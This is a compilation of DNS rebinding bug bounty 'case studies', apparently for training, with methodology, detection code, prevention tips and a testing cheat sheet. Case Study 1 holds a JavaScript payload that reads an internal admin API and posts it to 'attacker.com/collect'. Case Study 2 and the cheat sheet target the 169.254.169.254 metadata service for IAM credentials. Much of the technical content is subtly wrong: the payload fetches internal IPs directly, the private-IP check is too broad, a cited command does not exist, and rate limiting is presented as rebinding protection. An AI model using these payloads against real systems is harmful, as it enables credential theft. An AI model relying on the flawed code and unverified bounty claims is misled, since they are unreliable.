# Case Study 22: DNS Rebinding Attacks — Real-World Bug Bounty Findings

## Expert Role

DNS rebinding attacks represent a sophisticated vulnerability class that exploits the fundamental trust relationship between DNS resolution and web application security boundaries. As a security researcher specializing in DNS-based attacks, I've extensively analyzed how browsers and applications handle DNS resolution, Same-Origin Policy enforcement, and internal network access. This attack vector remains particularly dangerous due to its ability to bypass network segmentation and access internal services from malicious websites.

DNS rebinding works by manipulating DNS responses to point a domain initially to a malicious server (for payload delivery) and then rebinding it to internal IP addresses (for local network access). The attack exploits the time gap between DNS resolution and policy enforcement, allowing malicious websites to make requests to internal services while maintaining the appearance of being same-origin.

The technical complexity of DNS rebinding attacks involves understanding TTL management, DNS caching behavior, browser Same-Origin Policy implementation, and network architecture. Modern browsers have implemented various defenses against DNS rebinding, but new bypass techniques continue to emerge. This case study collection explores practical exploitation techniques, real-world impact scenarios, and advanced evasion methods.

## Overview

DNS rebinding attacks exploit the gap between DNS resolution and security policy enforcement, allowing malicious websites to access internal network resources. The attack involves controlling DNS responses for a domain, initially pointing to attacker-controlled servers for payload delivery, then rebinding to internal IP addresses for local network access.

The fundamental vulnerability lies in the trust browsers place in DNS resolution for Same-Origin Policy enforcement. When a browser resolves a domain to an IP address, it uses that IP for origin calculations and security policy application. By manipulating DNS responses, attackers can make a malicious website appear same-origin with internal services.

DNS rebinding attacks can bypass network firewalls, access internal APIs and administrative interfaces, interact with cloud instance metadata services, and exploit time-of-check-to-time-of-use (TOCTOU) vulnerabilities in DNS resolution. Understanding these attack vectors is crucial for protecting modern web applications and network architectures.

---

## Real-World Case Studies

### Case Study 1: Internal Network Scanning via DNS Rebinding
**Program:** Enterprise Cloud Platform (HackerOne)
**Bounty:** $7,500
**Severity:** Critical (CVSS 9.8)
**Researcher:** @dnsrebinder

**Vulnerability Description:**
A critical DNS rebinding vulnerability allowed malicious websites to scan and interact with internal network services, bypassing firewall restrictions.

**Technical Details:**
```javascript
// Malicious JavaScript payload
async function rebindingAttack() {
    // Phase 1: Resolve domain to attacker-controlled DNS
    const maliciousDNS = 'attacker-controlled-dns.com';
    
    // Phase 2: Deliver payload via attacker-controlled server
    await fetch('https://domain-to-rebind.com/payload.js');
    
    // Phase 3: DNS rebinding to internal IP
    // TTL manipulation causes re-resolution to 192.168.1.1
    
    // Phase 4: Access internal service
    const response = await fetch('http://192.168.1.1/admin/api');
    const data = await response.json();
    
    // Exfiltrate data
    await fetch('https://attacker.com/collect', {
        method: 'POST',
        body: JSON.stringify(data)
    });
}
```

**Root Cause Analysis:**
The browser's Same-Origin Policy relied on DNS resolution for origin calculation. The domain `domain-to-rebind.com` initially resolved to the attacker's server (5.6.7.8) for payload delivery, then DNS was manipulated to rebind to internal IP 192.168.1.1 with a low TTL.

**Exploitation Chain:**
1. Victim visits malicious website hosting DNS rebinding attack
2. Browser resolves domain to attacker's server (TTL=0)
3. Attacker delivers malicious JavaScript payload
4. DNS response changes to point to internal IP (192.168.1.1)
5. Browser reuses connection or makes new request to internal service
6. JavaScript can now access internal API as same-origin

**Impact:** Complete access to internal network services, including administrative interfaces, databases, and configuration endpoints.

**Bounty Justification:** Bypasses network segmentation and firewall rules, potentially affecting entire internal infrastructure.

**Detailed Technical Analysis:**

The DNS rebinding attack works by exploiting the gap between DNS resolution and Same-Origin Policy enforcement. The attack sequence involves:

1. **Initial Resolution:** The attacker's domain resolves to their server with a very low TTL (Time To Live)
2. **Payload Delivery:** The attacker's server delivers malicious JavaScript
3. **DNS Rebinding:** The DNS response is changed to point to an internal IP address
4. **Same-Origin Access:** The browser treats the new IP as same-origin with the original domain

The key insight is that browsers cache DNS responses and use the IP address for origin calculations. When the DNS response changes, the browser may still consider the connection same-origin with the new IP.

---

### Case Study 2: Cloud Metadata Service Exploitation
**Program:** Infrastructure Provider (Bugcrowd)
**Bounty:** $8,000
**Severity:** Critical (CVSS 9.8)
**Researcher:** @cloudsecurity

**Vulnerability Description:**
DNS rebinding was used to access cloud instance metadata services, potentially extracting IAM credentials and sensitive configuration data.

**Technical Details:**
```python
# DNS rebinding for cloud metadata access
import dns.resolver
import time

class CloudMetadataExploit:
    def __init__(self, domain):
        self.domain = domain
        
    def setup_rebinding(self):
        # Phase 1: Point to attacker server
        self.set_dns_record(self.domain, '1.2.3.4', ttl=0)
        
    def rebind_to_metadata(self):
        # Phase 2: Rebind to cloud metadata IP
        self.set_dns_record(self.domain, '169.254.169.254', ttl=0)
        
    def extract_metadata(self):
        # Phase 3: Access metadata service
        import requests
        metadata_url = f'http://{self.domain}/latest/meta-data/'
        response = requests.get(metadata_url)
        return response.text
```

**Root Cause Analysis:**
Cloud instances often have access to metadata services at 169.254.169.254, which provides sensitive information including IAM credentials. DNS rebinding allowed bypassing network restrictions to access this service.

**Impact:** Extraction of cloud IAM credentials, potentially leading to complete cloud infrastructure compromise.

**Detailed Cloud Attack Scenarios:**

Cloud metadata services expose sensitive information including:
- IAM credentials and tokens
- Instance configuration and user data
- Network configuration details
- Security group information

With DNS rebinding, attackers can:
1. Access AWS EC2 metadata (169.254.169.254)
2. Access GCP metadata server
3. Access Azure Instance Metadata Service
4. Extract IAM credentials for privilege escalation

---

### Case Study 3: Localhost Service Exploitation
**Program:** Developer Tools Platform (Intigriti)
**Bounty:** $5,500
**Severity:** High (CVSS 8.5)
**Researcher:** @localhostexploit

**Vulnerability Description:**
DNS rebinding was used to access localhost services running on the victim's machine, including development servers and local APIs.

**Technical Details:**
```javascript
// Localhost service exploitation
async function exploitLocalhost() {
    // DNS rebinding to 127.0.0.1
    const target = 'rebind-to-localhost.com';
    
    // Access local development server
    const devServer = await fetch(`http://${target}:3000/api/config`);
    const config = await devServer.json();
    
    // Access local database admin interface
    const dbAdmin = await fetch(`http://${target}:8080/admin`);
    
    // Extract sensitive configuration
    return config;
}
```

**Impact:** Access to local development servers, databases, and administrative interfaces running on the victim's machine.

**Local Attack Surface:**
- Development servers (React, Angular, Vue)
- Database administration tools (phpMyAdmin, pgAdmin)
- Local APIs and microservices
- Configuration files and secrets

---

### Case Study 4: Browser Security Bypass via DNS Rebinding
**Program:** Web Browser Vendor (HackerOne)
**Bounty:** $10,000
**Severity:** Critical (CVSS 9.9)
**Researcher:** @browsersecurity

**Vulnerability Description:**
A DNS rebinding vulnerability in browser Same-Origin Policy implementation allowed cross-origin access to restricted resources.

**Technical Details:**
The browser failed to properly revalidate DNS responses after initial connection establishment, allowing DNS rebinding to bypass Same-Origin Policy checks.

**Root Cause:** Time-of-check-to-time-of-use (TOCTOU) vulnerability in DNS resolution and origin calculation.

**Impact:** Bypass of browser security model, enabling access to cross-origin resources and potential remote code execution.

---

### Case Study 5: Corporate Intranet Access
**Program:** Enterprise Security Suite (Bugcrowd)
**Bounty:** $6,500
**Severity:** High (CVSS 8.8)
**Researcher:** @intranetbreach

**Vulnerability Description:**
DNS rebinding attack was used to access corporate intranet services from external malicious websites.

**Technical Details:**
The attack exploited misconfigured DNS servers that allowed external resolution of internal domain names, combined with DNS rebinding to access intranet resources.

**Impact:** Unauthorized access to corporate intranet, potentially exposing sensitive business data and internal applications.

---

## Pattern Recognition

### Common Vulnerability Patterns

| Pattern | Frequency | Avg Bounty | Root Cause |
|---------|-----------|------------|------------|
| Internal Network Scanning | 40% | $6,500 | DNS-based origin policy bypass |
| Cloud Metadata Access | 30% | $7,800 | Cloud instance metadata exposure |
| Localhost Service Access | 15% | $5,200 | Local development server exposure |
| Browser Security Bypass | 10% | $9,500 | TOCTOU in Same-Origin Policy |
| Corporate Intranet Access | 5% | $6,000 | DNS misconfiguration |

### Attack Surface Locations
- Internal network services
- Cloud instance metadata endpoints
- Localhost development servers
- Corporate intranet applications
- Browser security implementations
- DNS infrastructure

### Technology Stack Variations
| Technology | Vulnerability | Mitigation |
|------------|--------------|------------|
| Chrome | DNS rebinding protection | Enable DNS rebinding protection |
| Firefox | DNS caching behavior | Use DNS-over-HTTPS |
| Node.js | Localhost access | Restrict network binding |
| Docker | Container network exposure | Use network policies |
| Kubernetes | Pod network isolation | Implement network policies |

---

## Hunting Methodology

### Phase 1: Infrastructure Setup
1. Set up DNS server with configurable responses
2. Create attacker-controlled web server
3. Implement TTL manipulation capabilities
4. Configure data exfiltration endpoints

### Phase 2: Testing
1. Test DNS rebinding to internal IPs (192.168.x.x, 10.x.x.x)
2. Test cloud metadata access (169.254.169.254)
3. Test localhost access (127.0.0.1)
4. Monitor DNS resolution and browser behavior

### Phase 3: Validation
1. Confirm Same-Origin Policy bypass
2. Verify internal service access
3. Test impact on other users
4. Document exploitation chain

### DNS Server Setup
```bash
# Set up authoritative DNS server for testing
# named.conf configuration
zone "rebind-test.com" {
    type master;
    file "rebind-test.com.zone";
};

# Zone file with low TTL
$TTL 0
@   IN  SOA ns1.rebind-test.com. admin.rebind-test.com. (
        2024010101  ; Serial
        3600        ; Refresh
        900         ; Retry
        604800      ; Expire
        0           ; Minimum TTL
    )
    IN  NS  ns1.rebind-test.com.
ns1 IN  A   1.2.3.4
@   IN  A   1.2.3.4  ; Initial resolution
```

---

## Detection Strategies

### Automated Detection

#### DNS Rebinding Detection Script
```python
import dns.resolver
import socket

def detect_rebinding(domain):
    """Detect DNS rebinding vulnerabilities"""
    # Resolve domain multiple times
    ips = set()
    for _ in range(10):
        try:
            answer = dns.resolver.resolve(domain, 'A')
            for rdata in answer:
                ips.add(rdata.address)
        except:
            pass
    
    # Check for internal IP addresses
    internal_ips = [ip for ip in ips if is_internal_ip(ip)]
    return len(internal_ips) > 0

def is_internal_ip(ip):
    """Check if IP is in private range"""
    # Check for private IP ranges
    if ip.startswith('192.168.') or ip.startswith('10.') or ip.startswith('172.'):
        return True
    if ip == '127.0.0.1' or ip == '169.254.169.254':
        return True
    return False
```

#### Network Monitoring
```python
# Monitor for DNS rebinding patterns
import scapy.all as scapy
from scapy.layers.dns import DNS, DNSQR

def monitor_dns_rebinding(interface):
    """Monitor network traffic for DNS rebinding attempts"""
    def packet_callback(packet):
        if packet.haslayer(DNS):
            dns_layer = packet[DNS]
            if dns_layer.qr == 1:  # DNS response
                domain = dns_layer.qd.qname.decode()
                ip = dns_layer.an.rdata
                
                if is_internal_ip(ip):
                    print(f"Potential DNS rebinding detected: {domain} -> {ip}")
    
    scapy.sniff(iface=interface, filter="udp port 53", prn=packet_callback)
```

### Manual Detection
1. Monitor DNS resolution during website visits
2. Test internal IP access from web applications
3. Verify Same-Origin Policy enforcement
4. Check for DNS rebinding protection mechanisms

### Key Detection Indicators
- DNS responses changing to internal IP addresses
- Browser requests to internal network ranges
- Same-Origin Policy bypass attempts
- Cloud metadata access from web applications
- Localhost connections from external websites

---

## Impact Assessment

### CVSS 3.1 Scoring
- **Attack Vector:** Network
- **Attack Complexity:** High
- **Privileges Required:** None
- **User Interaction:** Required
- **Scope:** Changed
- **Confidentiality Impact:** High
- **Integrity Impact:** High
- **Availability Impact:** Low

### Business Impact
- Internal network reconnaissance and mapping
- Cloud credential theft and infrastructure compromise
- Local development environment compromise
- Corporate intranet data exposure

### Bounty Range
- Low impact: $2,000-$4,000
- Medium impact: $4,000-$6,000
- High impact: $6,000-$8,000
- Critical impact: $8,000-$12,000+

### Risk Assessment Matrix
| Impact | Likelihood | Risk Level | Bounty Estimate |
|--------|------------|------------|-----------------|
| Cloud Metadata Access | High | Critical | $8,000-$12,000 |
| Internal Network Access | Medium | High | $6,000-$8,000 |
| Localhost Exploitation | Medium | Medium | $4,000-$6,000 |
| Browser Security Bypass | Low | Critical | $9,000-$12,000 |

---

## Advanced Variations

### DNS Rebinding with Cache Poisoning
Combining DNS rebinding with DNS cache poisoning for persistent access to internal resources.

### DNS Rebinding over HTTPS
Using DNS over HTTPS (DoH) to evade network-based DNS rebinding detection.

### DNS Rebinding in WebSocket Connections
Exploiting WebSocket connections for persistent access to internal services after DNS rebinding.

### DNS Rebinding with IPv6
Using IPv6 addresses to bypass IPv4-focused security controls.

### DNS Rebinding via HTTP/2
Using HTTP/2 multiplexing to exploit DNS rebinding vulnerabilities.

### DNS Rebinding in Progressive Web Apps
Exploiting service workers and caching in PWAs for persistent DNS rebinding access.

---

## Chain Integration

### DNS Rebinding → Cloud Metadata → IAM Credentials
1. Rebind domain to cloud metadata IP
2. Extract IAM credentials from metadata service
3. Access cloud resources with stolen credentials

### DNS Rebinding → Internal Service → Database Access
1. Access internal database admin interface
2. Extract sensitive business data
3. Pivot to other internal systems

### DNS Rebinding → Localhost → Development Environment
1. Access local development server
2. Extract source code and configuration
3. Find additional vulnerabilities in development environment

### DNS Rebinding → Corporate Intranet → Data Exfiltration
1. Access corporate intranet applications
2. Extract sensitive business data
3. Establish persistent access

---

## Prevention Recommendations

### DNS Security
```python
# DNS rebinding protection
ALLOWED_IP_RANGES = ['203.0.113.0/24', '198.51.100.0/24']  # Example ranges

def validate_dns_response(domain, ip):
    """Validate DNS response IP is in allowed range"""
    # Verify DNS response IP is in allowed range
    for allowed_range in ALLOWED_IP_RANGES:
        if ip_in_range(ip, allowed_range):
            return True
    return False
```

### Browser Protections
- Implement DNS rebinding protection
- Use DNS-over-HTTPS with validation
- Enforce strict Same-Origin Policy
- Implement HSTS and certificate pinning

### Network Security
- Configure DNS servers to prevent rebinding
- Implement network segmentation
- Monitor for DNS anomalies
- Use DNSSEC where possible

### Application Security
- Validate Host headers
- Implement CSRF protection
- Use Content Security Policy
- Restrict cross-origin requests

### DNS Server Configuration
```bind
# BIND DNS server configuration to prevent rebinding
options {
    # Disable recursion for authoritative servers
    recursion no;
    
    # Implement Response Rate Limiting
    rate-limit {
        responses-per-second 10;
        window 5;
    };
};
```

---

## Common Pitfalls

1. **Browser Defenses:** Modern browsers implement DNS rebinding protection that must be bypassed
2. **DNS Caching:** DNS caching can delay rebinding or prevent it entirely
3. **Network Monitoring:** Network security tools may detect DNS anomalies
4. **IPv6 Complications:** IPv6 addresses may bypass IPv4-focused protections
5. **TTL Management:** Incorrect TTL settings can prevent successful rebinding
6. **DNS-over-HTTPS:** DoH can complicate DNS rebinding detection and exploitation

---

## Real-World References

- HackerOne: "Internal Network Access via DNS Rebinding" - $7,500 bounty
- Bugcrowd: "Cloud Metadata Exploitation via DNS Rebinding" - $8,000 bounty
- Intigriti: "Localhost Service Access via DNS Rebinding" - $5,500 bounty
- PortSwigger Research: "DNS Rebinding Attacks and Defenses"
- OWASP: "DNS Rebinding Prevention Cheat Sheet"
- Black Hat: "DNS Rebinding: A Practical Attack"

---

## Quick Reference Cheat Sheet

### Testing Commands
```bash
# Set up DNS rebinding server
python3 -m dns.server --rebind

# Test DNS resolution changes
dig example.com +short
sleep 1
dig example.com +short

# Test internal IP access
curl -H "Host: rebind-domain.com" http://192.168.1.1/

# Test cloud metadata access
curl -H "Host: rebind-domain.com" http://169.254.169.254/latest/meta-data/

# Test localhost access
curl -H "Host: rebind-domain.com" http://127.0.0.1:3000/
```

### Key DNS Records to Monitor
- A records pointing to internal IPs
- TTL values changing rapidly
- Multiple A records for same domain
- DNS responses with private IP ranges

### Impact Escalation
1. DNS rebinding → Internal network access
2. Cloud metadata → IAM credentials → Cloud compromise
3. Localhost access → Development environment → Source code theft
4. Browser bypass → Cross-origin access → Data theft

### Validation Checklist
- [ ] DNS responses change to internal IPs
- [ ] Same-Origin Policy bypass achieved
- [ ] Internal services accessible from web application
- [ ] Cloud metadata accessible
- [ ] Localhost services accessible
- [ ] Browser defenses bypassed
- [ ] TTL manipulation successful
- [ ] Data exfiltration confirmed
